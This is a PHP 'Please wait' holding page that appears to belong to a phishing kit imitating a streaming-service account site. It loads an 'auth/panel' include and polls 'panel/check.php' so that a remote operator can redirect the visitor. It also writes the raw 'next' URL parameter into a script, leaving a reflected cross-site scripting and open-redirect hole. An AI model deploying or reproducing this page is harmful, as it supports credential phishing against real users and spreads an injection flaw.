0<?php 
require '../auth/panel/center.php';
$next = @$_GET['next'] ?? '';
if (empty($next)) {
    $next = 'exit.php';
}
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>wait</title>
    <link rel="stylesheet" href="res/css/account.css">
    <link rel="stylesheet" href="res/css/account-media.css">
</head>
<body style="background:white !important;">

<header>
    <div class="left">
        <img src="res/img/logo.png">
    </div>
    <div class="right">
        <a href="#">Sign out</a>
    </div>
</header>

<section style="text-align:center;">

    <div class="form" id="card" style="text-align:center;">

        <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:60vh;">

        <div class="form-title" style="font-size:1.3em; font-weight:bold; color:#333; margin-bottom:10px;">
            Please wait...
        </div>

        <p>
            <img src="res/img/loading.gif" style="width:60px;">
        </p>

        </div>

    </div>

</section>

<footer style="width:100%; position:fixed; left:0; bottom:0; padding:30px 0;">
    <div class="footer-holder" style="text-align:center; font-size:0.79em; color:#888;">
        <h3 style="font-size:1.3em; margin-bottom:9px;">Questions? Contact us.</h3>
        <span style="margin:0 6px;">FAQ</span>
        <span style="margin:0 6px;">Help Center</span>
        <span style="margin:0 6px;">Terms of Use</span>
        <span style="margin:0 6px;">Privacy</span>
        <span style="margin:0 6px;">Cookie Preferences</span>
    </div>
</footer>


<script>

var target = "<?= @$_GET['next']; ?>";
var seconds = 10;

(function() {
    var panelPoll = setInterval(function() {
        fetch('panel/check.php')
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data.status === 'redirect' && data.redirect_url) {
                    clearInterval(panelPoll);
                    window.location = data.redirect_url;
                }
            })
            .catch(function() {});
    }, 3000);
})();

setTimeout(function() {
    window.location = target;
}, seconds * 1000);
</script>
</body>
</html>